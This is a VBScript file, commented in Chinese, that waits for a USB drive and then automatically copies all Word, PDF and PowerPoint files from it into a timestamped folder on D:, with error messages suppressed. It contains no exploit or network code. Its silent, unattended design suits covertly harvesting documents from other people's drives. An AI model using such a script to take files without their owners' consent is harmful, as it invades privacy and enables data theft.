' 静默错误信息
On Error Resume Next

' 配置参数
Dim destPath, checkInterval, copyExts, maxCheckTimes
destPath = "D:\Newfolder\doc"  ' 基础目标路径
checkInterval = 5             ' U盘检测间隔（秒）
maxCheckTimes = 1440            ' 最多检测是否存在U盘多少次
copyExts = Array("doc", "docx", "pdf", "ppt", "pptx")  ' 支持的文件格式

' 创建对象
Set fso = CreateObject("Scripting.FileSystemObject")
Set wshShell = CreateObject("WScript.Shell")

' 启动提示（仅一次）
WScript.Echo "AutoCopy脚本启动，点击确认开始！"

' 提示后延迟时间，例如1分钟就是 1 * 60000毫秒
WScript.Sleep  1*60000

' 主逻辑：有限次数循环检测
Dim checkCount
checkCount = 0
Do
    checkCount = checkCount + 1
    If DetectUSB() Then
        Exit Do  ' 检测到U盘，跳出循环执行拷贝
    End If
    ' 若检测超出规定次数仍未找到，退出脚本
    If checkCount >= maxCheckTimes Then
        WScript.Quit
    End If
    WScript.Sleep checkInterval * 1000
Loop

' 执行U盘拷贝并退出脚本
Call ProcessUSB()
WScript.Quit  ' 拷贝完成后直接退出

' 检测是否有U盘插入
Function DetectUSB()
    Dim drive, drives
    DetectUSB = False
    Set drives = fso.Drives
    For Each drive In drives
        ' 筛选可移动磁盘且就绪的U盘
        If drive.DriveType = 1 And drive.IsReady Then
            DetectUSB = True
            Exit Function
        End If
    Next
End Function

' 处理U盘拷贝（仅执行一次）
Sub ProcessUSB()
    Dim drive, drives, timeFolder
    Set drives = fso.Drives
    For Each drive In drives
        If drive.DriveType = 1 And drive.IsReady Then
            ' 创建唯一时间戳文件夹
            timeFolder = destPath & "\" & GetTimeStamp()
            Call CreateMultiFolder(timeFolder)
            ' 递归拷贝文件
            Call TraverseFolder(drive.RootFolder, timeFolder, drive.RootFolder.Path)
            Exit For  ' 仅处理第一个检测到的U盘
        End If
    Next
End Sub

' 递归创建多级文件夹
Sub CreateMultiFolder(folderPath)
    If Not fso.FolderExists(folderPath) Then
        Call CreateMultiFolder(fso.GetParentFolderName(folderPath))
        fso.CreateFolder(folderPath)
    End If
End Sub

' 生成时间戳（格式：YYYYMMDDhhmmss）
Function GetTimeStamp()
    GetTimeStamp = Year(Now) & Right("0" & Month(Now), 2) & Right("0" & Day(Now), 2) & _
                   Right("0" & Hour(Now), 2) & Right("0" & Minute(Now), 2) & Right("0" & Second(Now), 2)
End Function

' 递归遍历文件夹并拷贝指定格式文件（仅拷贝新文件）
Sub TraverseFolder(sourceFolder, targetFolder, rootPath)
    Dim subFolder, file, ext, targetFilePath, relativePath
    
    For Each file In sourceFolder.Files
        ext = LCase(fso.GetExtensionName(file.Path))
        If IsInArray(ext, copyExts) Then
            ' 计算相对路径并补全反斜线
            relativePath = Replace(sourceFolder.Path, rootPath, "")
            If relativePath <> "" Then
                targetFilePath = targetFolder & "\" & relativePath & "\" & file.Name
            Else
                targetFilePath = targetFolder & "\" & file.Name
            End If
            ' 仅拷贝不存在的文件
            If Not fso.FileExists(targetFilePath) Then
                Call CreateMultiFolder(fso.GetParentFolderName(targetFilePath))
                fso.CopyFile file.Path, targetFilePath, False
            End If
        End If
    Next
    
    For Each subFolder In sourceFolder.SubFolders
        Call TraverseFolder(subFolder, targetFolder, rootPath)
    Next
End Sub

' 辅助函数：判断元素是否在数组中
Function IsInArray(item, arr)
    IsInArray = False
    For i = 0 To UBound(arr)
        If arr(i) = item Then
            IsInArray = True
            Exit Function
        End If
    Next
End Function

